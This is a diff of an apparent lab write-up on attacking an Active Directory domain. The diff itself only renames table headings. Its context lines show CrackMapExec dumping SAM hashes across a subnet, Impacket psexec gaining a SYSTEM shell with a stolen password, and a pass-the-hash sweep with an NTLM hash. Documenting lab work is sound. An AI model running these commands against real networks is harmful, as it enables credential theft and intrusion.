@@ -135,9 +135,9 @@ I used **CrackMapExec** to scan the subnet and included the `--sam` option to du
 ```bash
 crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --sam
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Flag              | Description |
+| Part              | Description |
 |---------------------------------|---------------------------------------------------------------------------|
 | `smb`                            | Uses the SMB protocol to communicate with Windows hosts.                  |
 | `192.168.5.0/24`                 | Target subnet. CrackMapExec will scan all hosts within this network range. |
@@ -190,9 +190,9 @@ To confirm that the credentials had administrative access, I connected to **VICT
 ```bash
 psexec.py readteambd/rahimkhan:Password1@192.168.5.135
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Flag  | Description |
+| Part  | Description |
 |-----------------|---------------------------------------------------------------------------|
 | `psexec.py`     | Impacket tool that uses valid credentials to get a SYSTEM shell on a remote Windows host via SMB. |
 | `readteambd`    | Active Directory domain the target belongs to. |
@@ -394,9 +394,9 @@ Instead of using a password, I used the recovered NTLM hash to authenticate with
 ```bash
 crackmapexec smb 192.168.5.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Flag           | Description |
+| Part           | Description |
 |----------------|---------------------------------------------------------------------------|
 | `smb`                                        | Uses the SMB protocol to communicate with Windows hosts.                  |
 | `192.168.5.0/24`                             | Target subnet. CrackMapExec will scan all hosts within this network range. |
